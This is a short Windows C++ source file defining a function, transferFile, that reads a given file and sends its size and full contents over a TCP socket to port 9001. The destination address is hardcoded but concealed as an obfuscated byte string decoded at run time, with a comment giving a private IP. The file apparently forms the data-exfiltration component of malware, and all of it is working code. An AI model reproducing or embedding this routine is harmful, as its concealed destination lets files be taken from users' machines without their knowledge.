#include "stdafx.h"
#include "sendfile.h"
#include "obfuscate.h"

#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>

#pragma warning(disable:4996)

#define PORT 9001

BOOL transferFile(std::string filename)
{
	//192.168.50.111

	SOCKET sock;
	sockaddr_in addr;
	WSADATA version;

	char buffer[BUFSIZ];
	char fileSize[256];
	off_t fSize;
	int remainingData;
	int sentBytes = 0;

	FILE *outFile;

	std::string ipAddress = obf::decode("\x9f\xb2\x9a\xb9\xbd\x9b\xb4\x90\x8c\x9e\xba\xaf\xa4\x97");

	if (WSAStartup(MAKEWORD(2, 2), &version) != 0) { return FALSE; }

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if (sock < 0)
	{
		WSACleanup();
		return FALSE; 
	}

	memset(&addr, 0, sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	inet_pton(AF_INET, ipAddress.c_str(), &addr.sin_addr);

	if (connect(sock, (sockaddr*)&addr, sizeof(addr)) < 0)
	{
		WSACleanup();
		return FALSE;
	}

	outFile = fopen(filename.c_str(), "rb");

	if (outFile == NULL)
	{
		closesocket(sock);
		WSACleanup();
		return FALSE;
	}

	fseek(outFile, 0L, SEEK_END);
	fSize = (off_t)ftell(outFile);
	fseek(outFile, 0L, SEEK_SET);

	if (fSize == -1L)
	{
		closesocket(sock);
		WSACleanup();
		return FALSE;
	}

	sprintf(fileSize, "%d", fSize);

	if (send(sock, fileSize, sizeof(fileSize), 0) < 0)
	{
		closesocket(sock);
		WSACleanup();
		return FALSE;
	}

	remainingData = fSize;

	while (((sentBytes = fread(&buffer, 1, BUFSIZ, outFile)) != 0) && (remainingData != 0))
	{
		send(sock, buffer, sentBytes, 0);
		remainingData -= sentBytes;
	}

	closesocket(sock);
	WSACleanup();

	return TRUE;
}